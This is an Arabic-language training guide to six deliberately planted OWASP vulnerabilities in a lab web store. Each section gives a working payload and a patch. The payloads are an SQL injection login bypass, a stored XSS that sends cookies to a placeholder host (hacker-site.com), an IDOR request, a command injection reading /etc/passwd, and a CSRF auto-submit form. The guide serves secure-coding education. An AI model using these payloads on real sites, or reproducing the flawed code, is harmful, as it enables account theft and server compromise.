# 📖 دليل الثغرات الأمنية (Vulnerabilities Guide)
**CyberTools Educational Store**

هذا الدليل مخصص لشرح الثغرات الأمنية (OWASP Top 10) المدمجة عمداً في منصة CyberTools. يشرح الدليل كيفية استغلال كل ثغرة لاختبارها محلياً، وكيفية إصلاحها برمجياً (Patching).

> ⚠️ **تحذير:** الاستغلال مسموح فقط في بيئتك المحلية (Localhost). استغلال هذه الثغرات في أنظمة حقيقية دون تصريح هو عمل غير قانوني.

---

## 1. حقن قواعد البيانات (SQL Injection) 💉

### 🔴 مكان الثغرة: 
تسجيل الدخول (`backend/api/auth.php`)

### 🔓 كيفية الاستغلال:
في صفحة تسجيل الدخول (`login.html`)، جرب إدخال القيمة التالية في حقل **اسم المستخدم**:
```text
admin' -- 
```
واترك كلمة المرور فارغة أو اكتب أي شيء.
**النتيجة:** سيتم تسجيل دخولك بحساب الإدارة (Admin) فوراً متجاوزاً التحقق من كلمة المرور.
**السبب:** الكود يقوم بدمج المدخلات مباشرة في الاستعلام:
```php
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
// عند الإدخال يصبح:
// SELECT * FROM users WHERE username = 'admin' -- ' AND password = '...'
```
*(الرمز `--` يقوم بتحويل باقي السطر إلى تعليق).*

### 🛡️ كيفية الإصلاح (Patch):
استخدم **Prepared Statements**:
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $username]);
$user = $stmt->fetch();
```

---

## 2. البرمجيات الخبيثة العابرة للمواقع (XSS - Cross Site Scripting) 🕷️

### 🔴 مكان الثغرة (Stored XSS): 
نظام المراجعات والتقييمات (`backend/api/reviews.php` و `product-details.html`)

### 🔓 كيفية الاستغلال:
1. سجل دخولك كعميل.
2. اذهب لصفحة تفاصيل أي منتج.
3. في مربع **التعليق**، أدخل الكود التالي:
```html
<script>alert('تم اختراق الجلسة: ' + document.cookie);</script>
```
أو لسرقة الجلسات:
```html
<img src="x" onerror="window.location.href='http://hacker-site.com/steal?cookie='+document.cookie">
```
**النتيجة:** كل من يزور صفحة المنتج سيتم تنفيذ كود الـ JavaScript لديه. 
**السبب:** يتم حفظ التعليق في قاعدة البيانات وعرضه في واجهة المستخدم (Frontend) دون أي تعقيم (Sanitization).

### 🛡️ كيفية الإصلاح (Patch):
في واجهة المستخدم (Frontend) أو (Backend)، استخدم دوال تحويل الرموز الخاصة:
```javascript
// في JS
element.textContent = user_input; // بدلاً من innerHTML
```
```php
// في PHP (عند إرجاع البيانات)
echo htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');
```

---

## 3. التحكم المكسور في الوصول (Broken Access Control - IDOR) 🚪

### 🔴 مكان الثغرة: 
استعراض الطلبات (`backend/api/orders.php`)

### 🔓 كيفية الاستغلال:
1. سجل دخولك كعميل عادي (مثل `customer1`).
2. اذهب إلى صفحة طلباتك. يقوم المتصفح بإرسال طلب API لجلب طلباتك بناءً على الـ ID الخاص بك (مثلاً `?user_id=4`).
3. استخدم أداة مثل Postman أو متصفحك وقم بتغيير الرقم إلى ID مدير أو عميل آخر:
```http
GET http://localhost:8080/api/orders.php?user_id=1
```
**النتيجة:** سترى جميع طلبات المستخدم رقم 1 رغم أنك مسجل بحساب رقم 4.
**السبب:** لا يتحقق الخادم (Backend) مما إذا كان الـ `user_id` المطلوب يطابق الـ `user_id` الخاص بالجلسة الحالية `$_SESSION`.

### 🛡️ كيفية الإصلاح (Patch):
قم بمقارنة الهوية المطلوبة مع هوية الجلسة الموثوقة:
```php
if ($_GET['user_id'] != $_SESSION['user']['id'] && $_SESSION['user']['role'] !== 'admin') {
    http_response_code(403);
    die(json_encode(["error" => "Access Denied"]));
}
```

---

## 4. حقن الأوامر (Command Injection) 💻

### 🔴 مكان الثغرة: 
أداة فحص الشبكة Ping في لوحة المسؤول (`backend/api/admin/stats.php`)

### 🔓 كيفية الاستغلال:
1. اذهب إلى لوحة تحكم المسؤول (متاحة للجميع حالياً بسبب ثغرة Access Control).
2. في قسم **أداة Ping**، أدخل التالي:
```bash
8.8.8.8; cat /etc/passwd
```
**النتيجة:** سيتم عرض محتويات ملف `passwd` الخاص بنظام Linux للخادم!
**السبب:** يتم أخذ متغير الـ `ip` وتمريره مباشرة إلى دالة `shell_exec`:
```php
$output = shell_exec("ping -c 2 " . $_GET['ip']);
```

### 🛡️ كيفية الإصلاح (Patch):
يجب التحقق الصارم من أن المدخل هو عنوان IP حقيقي، واستخدام دوال الهروب:
```php
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    $safe_ip = escapeshellarg($ip);
    $output = shell_exec("ping -c 2 " . $safe_ip);
} else {
    die("Invalid IP");
}
```

---

## 5. تزوير الطلبات عبر المواقع (CSRF) 🔄

### 🔴 مكان الثغرة: 
نموذج تغيير كلمة المرور و الدفع (`profile.html` و `checkout.html`)

### 🔓 كيفية الاستغلال:
يمكن للمهاجم إنشاء صفحة HTML خفية وإرسالها للضحية:
```html
<form action="http://localhost:8080/api/users.php?id=1" method="POST" id="hack">
    <!-- حقول مخفية لتغيير البيانات أو كلمة المرور -->
</form>
<script>document.getElementById('hack').submit();</script>
```
بمجرد فتح الضحية (الذي سجل دخوله مسبقاً) للصفحة، سيتم تنفيذ الطلب بصلاحياته.
**السبب:** لا يوجد ما يثبت أن الطلب صادر من النموذج الحقيقي للموقع (غياب الـ CSRF Token).

### 🛡️ كيفية الإصلاح (Patch):
1. إنشاء توكن عشوائي لكل جلسة: `$_SESSION['csrf_token'] = bin2hex(random_bytes(32));`
2. تضمينه كحقل مخفي في نماذج الـ HTML.
3. التحقق من تطابقه عند استقبال الطلب (POST) في الخادم.

---

## 6. التخزين غير الآمن للمعلومات الحساسة (Cryptographic Failures) 🔓

### 🔴 مكان الثغرة: 
قاعدة البيانات وجداول المستخدمين والمدفوعات (`database/schema.sql`)

### 🔓 كيفية الاستغلال:
في حال نجح المهاجم في سحب قاعدة البيانات (عبر SQL Injection)، سيجد أن كلمات المرور وأرقام البطاقات الائتمانية مخزنة **كنص صريح (Plain Text)** أو بتشفير ضعيف جداً (مثل MD5).
مثال في قاعدة البيانات:
`admin | admin123 | 4532...`

### 🛡️ كيفية الإصلاح (Patch):
- **لكلمات المرور:** يجب استخدام التجزئة القوية (Hashing) عبر دالة `password_hash()` في PHP التي تستخدم خوارزمية `bcrypt`.
- **لبطاقات الدفع:** لا يجب تخزينها على الخادم، بل استخدام خدمات دفع خارجية (Payment Gateways) مثل Stripe أو ميزة التشفير القابل للعكس (Symmetric Encryption) بمفاتيح خارج قاعدة البيانات إذا لزم الأمر.

---
**تدريب سعيد! وتذكر دائماً التفكير بعقلية المهاجم لتتمكن من بناء أنظمة محصنة.**
